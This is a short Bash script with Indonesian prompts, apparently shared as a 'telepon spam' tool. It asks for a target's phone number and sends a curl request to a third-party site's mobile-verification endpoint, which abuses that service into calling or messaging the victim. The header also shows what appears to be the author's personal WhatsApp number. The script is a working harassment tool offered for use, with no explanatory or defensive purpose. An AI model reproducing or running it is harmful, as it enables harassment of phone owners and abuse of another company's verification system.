#!bin/bash
clear

echo "****************************"
echo "____________________________"
echo "[+] Author  : CIMEX/MR-D47ID,"
echo "[+] Youtube : Fawwaz Channel"
echo "[+] WA	    : 083831136068"
echo "____________________________"
echo "****************************"
figlet Cimex | lolcat
echo "::::::::::::::::::::::::::::::"
echo '
[1], telepon spam
[2], keluar &kontak admin
'
echo "::::::::::::::::::::::::::::::"
echo
read -p "masukan pilihan kalian lurd : " pil
if [[ $pil == 1 ]]; then
read -p "Masukan No Target contoh:83831136068  : " nomor
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
else
echo "thanks ya lurd udah pakai tool CIMEX/MR-D47ID"
echo "kontak admin?083831136068"
exit
fi
echo
